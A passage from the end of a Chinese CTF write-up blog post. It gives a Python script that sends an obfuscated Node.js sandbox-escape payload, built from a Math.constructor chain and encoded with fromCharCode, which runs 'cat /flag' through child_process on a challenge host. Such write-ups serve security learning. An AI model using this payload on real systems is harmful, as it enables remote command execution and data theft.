+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests </span><br><span class="line">import json </span><br><span class="line">headers = &#123; &quot;Content-Type&quot;:&quot;application/json&quot; &#125; </span><br><span class="line">url = &quot;http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/&quot; </span><br><span class="line">data = &#123;&quot;e&quot;:&#x27;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#x27;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125; </span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers) </span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://fu163.github.io">早起大王</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://fu163.github.io/2025/05/26/c1e0de8de76a330f8763aaca37bd2c28_22215bbcae78e3da94be67df0ea089a4_8/">https://fu163.github.io/2025/05/26/c1e0de8de76a330f8763aaca37bd2c28_22215bbcae78e3da94be67df0ea089a4_8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://fu163.github.io" target="_blank">早起大王的世界</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JS%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/">JS弱类型比较</a><a class="post-meta__tags" href="/tags/Node-Js/">Node.Js</a><a class="post-meta__tags" href="/tags/hash%E7%BB%95%E8%BF%87/">hash绕过</a></div><div class="post-share"><div class="social-share" data-image="/img/5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/26/LitCTF2025-WriteUp/" title="LitCTF2025-WriteUp"><img class="cover" src="/img/6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">LitCTF2025-WriteUp</div></div><div class="info-2"><div class="info-item-1">Webez_signin(爆破时间戳) 一进去是403 扫目录扫出来/login.html，访问  一个文档管理系统 先来爆破一下这个登录系统 抓包，爆破username和password 爆破出来用户名和密码为admin&#x2F;admin123 但当登录的时候显示签名错误 来看JS源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;script&gt;        const loginBtn = document.getElementById(&#x27;loginBtn&#x27;);        const passwordInput = document.getElementById(&#x27;password&#x27;);        const errorTip =...</div></div></div></a><a class="pagination-related" href="/2025/05/26/eab11d7fe8d61bebe3b320d8d6287770_6238515a0f878d18667cb852f33eeaab_8/" title="[CISCN2019 华东北赛区]Web2"><img class="cover" src="/img/6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[CISCN2019 华东北赛区]Web2</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">早起大王</div><div class="author-info-description">付名凤 220162401007</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fu163"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/fu163" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3260798586@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎各位莅临早起大王的博客。若在浏览过程中发现错误或感到疑惑，请随时提出。交流共进，让思想在此碰撞出火花。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JS%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-number">1.</span> <span class="toc-text">JS弱类型比较</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">知识点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">正则绕过</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/02/P5076%20%E3%80%90%E6%B7%B1%E5%9F%BA16.%E4%BE%8B7%E3%80%91%E6%99%AE%E9%80%9A%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%88%E7%AE%80%E5%8C%96%E7%89%88%EF%BC%89/" title="P5076 【深基16.例7】普通二叉树（简化版）"><img src="/img/15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="P5076 【深基16.例7】普通二叉树（简化版）"/></a><div class="content"><a class="title" href="/2025/06/02/P5076%20%E3%80%90%E6%B7%B1%E5%9F%BA16.%E4%BE%8B7%E3%80%91%E6%99%AE%E9%80%9A%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%88%E7%AE%80%E5%8C%96%E7%89%88%EF%BC%89/" title="P5076 【深基16.例7】普通二叉树（简化版）">P5076 【深基16.例7】普通二叉树（简化版）</a><time datetime="2025-06-02T08:23:07.449Z" title="发表于 2025-06-02 16:23:07">2025-06-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/02/P1827%20%5BUSACO3.4%5D%20%E7%BE%8E%E5%9B%BD%E8%A1%80%E7%BB%9F%20American%20Heritage/" title="P1827 [USACO3.4] 美国血统 American Heritage"><img src="/img/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="P1827 [USACO3.4] 美国血统 American Heritage"/></a><div class="content"><a class="title" href="/2025/06/02/P1827%20%5BUSACO3.4%5D%20%E7%BE%8E%E5%9B%BD%E8%A1%80%E7%BB%9F%20American%20Heritage/" title="P1827 [USACO3.4] 美国血统 American Heritage">P1827 [USACO3.4] 美国血统 American Heritage</a><time datetime="2025-06-02T08:23:07.446Z" title="发表于 2025-06-02 16:23:07">2025-06-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/02/%E9%87%8D%E6%96%B0%E6%8E%92%E9%98%9F%EF%BC%88%E8%93%9D%E6%A1%A53255%EF%BC%89/" title="重新排队（蓝桥3255）"><img src="/img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="重新排队（蓝桥3255）"/></a><div class="content"><a class="title" href="/2025/06/02/%E9%87%8D%E6%96%B0%E6%8E%92%E9%98%9F%EF%BC%88%E8%93%9D%E6%A1%A53255%EF%BC%89/" title="重新排队（蓝桥3255）">重新排队（蓝桥3255）</a><time datetime="2025-06-01T17:24:03.812Z" title="发表于 2025-06-02 01:24:03">2025-06-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/02/%E5%B0%8F%E7%8E%8B%E5%AD%90%E5%8F%8C%E9%93%BE%E8%A1%A8%EF%BC%88%E8%93%9D%E6%A1%A51112%EF%BC%89/" title="小王子双链表（蓝桥1112）"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小王子双链表（蓝桥1112）"/></a><div class="content"><a class="title" href="/2025/06/02/%E5%B0%8F%E7%8E%8B%E5%AD%90%E5%8F%8C%E9%93%BE%E8%A1%A8%EF%BC%88%E8%93%9D%E6%A1%A51112%EF%BC%89/" title="小王子双链表（蓝桥1112）">小王子双链表（蓝桥1112）</a><time datetime="2025-06-01T17:24:03.809Z" title="发表于 2025-06-02 01:24:03">2025-06-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/02/%E5%B0%8F%E7%8E%8B%E5%AD%90%E5%8D%95%E9%93%BE%E8%A1%A8%EF%BC%88%E8%93%9D%E6%A1%A51110%EF%BC%89/" title="小王子单链表（蓝桥1110）"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小王子单链表（蓝桥1110）"/></a><div class="content"><a class="title" href="/2025/06/02/%E5%B0%8F%E7%8E%8B%E5%AD%90%E5%8D%95%E9%93%BE%E8%A1%A8%EF%BC%88%E8%93%9D%E6%A1%A51110%EF%BC%89/" title="小王子单链表（蓝桥1110）">小王子单链表（蓝桥1110）</a><time datetime="2025-06-01T17:24:03.806Z" title="发表于 2025-06-02 01:24:03">2025-06-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/image1.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By 早起大王</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'FU163/my-blog',
+      'data-repo-id': 'R_kgDOOzsgZQ',
+      'data-category-id': 'DIC_kwDOOzsgZc4Cq5oR',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"live2d-widget-model-<live2d-widget-model-tororo>"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>
